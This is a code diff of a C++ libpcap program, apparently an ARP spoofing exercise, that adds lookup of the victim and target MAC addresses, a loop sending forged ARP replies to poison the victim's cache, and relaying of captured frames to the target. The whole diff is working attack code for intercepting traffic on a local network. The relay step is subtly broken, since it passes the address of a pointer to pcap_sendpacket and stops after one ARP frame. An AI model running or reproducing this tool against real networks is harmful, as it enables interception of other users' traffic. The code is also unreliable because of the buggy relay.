@@ -26,44 +26,56 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	Mac my_mac, sender_mac;
-	get_attacker_mac(dev, &my_mac);
+	Mac attacker_mac, sender_mac, target_mac;
+	get_attacker_mac(dev, &attacker_mac);
 
-	Ip my_ip;
-	get_attacker_ip(dev, &my_ip);
-
+	Ip attacker_ip;
+	get_attacker_ip(dev, &attacker_ip);
 	printf("\n");
 
 	for(int i = 2; i < argc; i+=2) {
 		Ip sender_ip = Ip(argv[i]);
 		Ip target_ip = Ip(argv[i+1]);
 
-		send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac, ArpHdr::Request ,my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip);
+		Mac sender_mac = get_sender_mac(handle, attacker_mac, attacker_ip, sender_ip, 0);
+		printf("\n");
+		Mac target_mac = get_sender_mac(handle, attacker_mac, attacker_ip, target_ip, 1);
+		printf("\n");
 
+		
+		EthArpPacket* relay_packet;
 		while(true) {
-			struct pcap_pkthdr* header;
-			const u_char* send_packet;
-			int res = pcap_next_ex(handle, &header, &send_packet);
+			send_arp(handle, sender_mac, attacker_mac, ArpHdr::Reply, attacker_mac, target_ip, sender_mac, sender_ip, true);
+
+			struct pcap_pkthdr* header2;
+			const u_char* packet2;
+
+			int res = pcap_next_ex(handle, &header2, &packet2);
 			if (res == 0) continue;
 			if (res == -1 || res == -2) {
 				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 				break;
 			}
 
-			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));
+			EthArpPacket* spoofed_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet2));
 
-			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
-			if(eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
-			if(eth_arp_packet->arp_.sip_!= htonl(sender_ip)) continue;
+			if(spoofed_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
 
-			sender_mac = eth_arp_packet->arp_.smac_;
-			printf("Get sender MAC: %s\n", std::string(sender_mac).c_str());
+			relay_packet = spoofed_packet;
+			relay_packet->eth_.smac_ = attacker_mac;
+			relay_packet->eth_.dmac_ = target_mac;
 
+			int relay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet), sizeof(EthArpPacket));
+
+			if (relay != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", relay, pcap_geterr(handle));
+			}
+			else {
+				printf("send relay packet success\n");
+			}
 			break;
 		}
-
-		send_arp(handle, sender_mac, my_mac, ArpHdr::Reply, my_mac, target_ip, sender_mac, sender_ip);
-
 	}
+
 	pcap_close(handle);
 }
